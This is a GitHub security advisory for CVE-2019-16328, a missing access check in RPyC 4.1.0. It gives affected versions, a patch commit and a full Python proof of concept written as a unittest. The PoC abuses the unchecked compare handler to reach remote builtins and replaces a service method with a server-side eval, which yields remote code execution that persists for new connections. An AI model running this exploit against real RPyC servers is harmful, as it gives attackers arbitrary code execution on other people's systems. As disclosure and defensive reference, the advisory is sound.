# [H] Dynamic modification of RPyC service due to missing security check

## Summary
Severity: High
Advisory: GHSA-pj4g-4488-wmxm
CVE: CVE-2019-16328
CWE: CWE-1321, CWE-285
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2021-02-17
Source: https://github.com/advisories/GHSA-pj4g-4488-wmxm
Type: github-advisory

## Affected
- PyPI: `rpyc` — affected >=4.1.0 <4.1.1

## Details
### Impact
Version 4.1.0 of RPyC has a vulnerability that affects custom RPyC services making it susceptible to authenticated remote attacks.

### Patches
Git commits between September 2018 and October 2019 and version 4.1.0 are vulnerable. Use a version of RPyC that is not affected.

### Workarounds
The commit `d818ecc83a92548994db75a0e9c419c7bce680d6` could be used as a patch to add the missing access check.

### References
[CVE-2019-16328](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16328)
[RPyC Security Documentation](https://rpyc.readthedocs.io/en/latest/docs/security.html#security)

### For more information
If you have any questions or comments about this advisory:
* Open an issue using [GitHub](https://github.com/tomerfiliba-org/rpyc)

### Proof of Concept
```
import logging
import rpyc
import tempfile
from subprocess import Popen, PIPE
import unittest


PORT = 18861
SERVER_SCRIPT = f"""#!/usr/bin/env python
import rpyc
from rpyc.utils.server import ThreadedServer, ThreadPoolServer
from rpyc import SlaveService
import rpyc


class Foe(object):
    foo = "bar"


class Fee(rpyc.Service):
    exposed_Fie = Foe

    def exposed_nop(self):
        return


if __name__ == "__main__":
    server = ThreadedServer(Fee, port={PORT}, auto_register=False)
    thd = server.start()
"""


def setattr_orig(target, attrname, codeobj):
    setattr(target, attrname, codeobj)


def myeval(self=None, cmd="__import__('sys')"):
    return eval(cmd)


def get_code(obj_codetype, func, filename=None, name=None):
    func_code = func.__code__
    arg_names = ['co_argcount', 'co_posonlyargcount', 'co_kwonlyargcount', 'co_nlocals', 'co_stacksize', 'co_flags',
                 'co_code', 'co_consts', 'co_names', 'co_varnames', 'co_filename', 'co_name', 'co_firstlineno',
                 'co_lnotab', 'co_freevars', 'co_cellvars']

    codetype_args = [getattr(func_code, n) for n in arg_names]
    if filename:
        codetype_args[arg_names.index('co_filename')] = filename
    if name:
        codetype_args[arg_names.index('co_name')] = name
    mycode = obj_codetype(*codetype_args)
    return mycode


def _vercmp_gt(ver1, ver2):
    ver1_gt_ver2 = False
    for i, v1 in enumerate(ver1):
        v2 = ver2[i]
        if v1 > v2:
            ver1_gt_ver2 = True
            break
        elif v1 == v2:
            continue
        else:  # v1 < v2
            break
    return ver1_gt_ver2


@unittest.skipIf(not _vercmp_gt(rpyc.__version__, (3, 4, 4)), "unaffected version")
class Test_InfoDisclosure_Service(unittest.TestCase):

    @classmethod
    def setUpClass(cls):

        cls.logger = logging.getLogger('rpyc')
        cls.logger.setLevel(logging.DEBUG)  # NOTSET only traverses until another level is found, so DEBUG is preferred
        cls.hscript = tempfile.NamedTemporaryFile()
        cls.hscript.write(SERVER_SCRIPT.encode())
        cls.hscript.flush()
        while cls.hscript.file.tell() != len(SERVER_SCRIPT):
            pass
        cls.server = Popen(["python", cls.hscript.name], stdout=PIPE, stderr=PIPE, text=True)
        cls.conn = rpyc.connect("localhost", PORT)

    @classmethod
    def tearDownClass(cls):
        cls.conn.close()
        cls.logger.info(cls.server.stdout.read())
        cls.logger.info(cls.server.stderr.read())
        cls.server.kill()
        cls.hscript.close()

    def netref_getattr(self, netref, attrname):
        # PoC CWE-358: abuse __cmp__ function that was missing a security check
        handler = rpyc.core.consts.HANDLE_CMP
        return self.conn.sync_request(handler, netref, attrname, '__getattribute__')

    def test_1_modify_nop(self):
        # create netrefs for builtins and globals that will be used to construct on remote
        remote_svc_proto = self.netref_getattr(self.conn.root, '_protocol')
        remote_dispatch = self.netref_getattr(remote_svc_proto, '_dispatch_request')
        remote_class_globals = self.netref_getattr(remote_dispatch, '__globals__')
        remote_modules = self.netref_getattr(remote_class_globals['sys'], 'modules')
        _builtins = remote_modules['builtins']
        remote_builtins = {k: self.netref_getattr(_builtins, k) for k in dir(_builtins)}

        # populate globals for CodeType calls on remote
        remote_globals = remote_builtins['dict']()
        for name, netref in remote_builtins.items():
            remote_globals[name] = netref
        for name, netref in self.netref_getattr(remote_modules, 'items')():
            remote_globals[name] = netref

        # create netrefs for types to create remote function malicously
        remote_types = remote_builtins['__import__']("types")
        remote_types_CodeType = self.netref_getattr(remote_types, 'CodeType')
        remote_types_FunctionType = self.netref_getattr(remote_types, 'FunctionType')

        # remote eval function constructed
        remote_eval_codeobj = get_code(remote_types_CodeType, myeval, filename='test_code.py', name='__code__')
        remote_eval = remote_types_FunctionType(remote_eval_codeobj, remote_globals)
        # PoC CWE-913: modify the exposed_nop of service
        #   by binding various netrefs in this execution frame, they are cached in
        #   the remote address space. setattr and eval functions are cached for the life
        #   of the netrefs in the frame. A consequence of Netref classes inheriting
        #   BaseNetref, each object is cached under_local_objects. So, we are able
        #   to construct arbitrary code using types and builtins.

        # use the builtin netrefs to modify the service to use the constructed eval func
        remote_setattr = remote_builtins['setattr']
        remote_type = remote_builtins['type']
        remote_setattr(remote_type(self.conn.root), 'exposed_nop', remote_eval)

        # show that nop was replaced by eval to complete the PoC
        remote_sys = self.conn.root.nop('__import__("sys")')
        remote_stack = self.conn.root.nop('"".join(__import__("traceback").format_stack())')
        self.assertEqual(type(remote_sys).__name__, 'builtins.module')
        self.assertIsInstance(remote_sys, rpyc.core.netref.BaseNetref)
        self.assertIn('rpyc/utils/server.py', remote_stack)

    def test_2_new_conn_impacted(self):
        # demostrate impact and scope of vuln for new connections
        self.conn.close()
        self.conn = rpyc.connect("localhost", PORT)
        # show new conn can still use nop as eval
        remote_sys = self.conn.root.nop('__import__("sys")')
        remote_stack = self.conn.root.nop('"".join(__import__("traceback").format_stack())')
        self.assertEqual(type(remote_sys).__name__, 'builtins.module')
        self.assertIsInstance(remote_sys, rpyc.core.netref.BaseNetref)
        self.assertIn('rpyc/utils/server.py', remote_stack)


if __name__ == "__main__":
    unittest.main()
```

## References
- https://github.com/tomerfiliba-org/rpyc/security/advisories/GHSA-pj4g-4488-wmxm
- https://nvd.nist.gov/vuln/detail/CVE-2019-16328
- https://github.com/tomerfiliba-org/rpyc
- https://github.com/tomerfiliba/rpyc
- https://rpyc.readthedocs.io/en/latest/docs/security.html
- http://lists.opensuse.org/opensuse-security-announce/2020-05/msg00046.html
- http://lists.opensuse.org/opensuse-security-announce/2020-06/msg00004.html
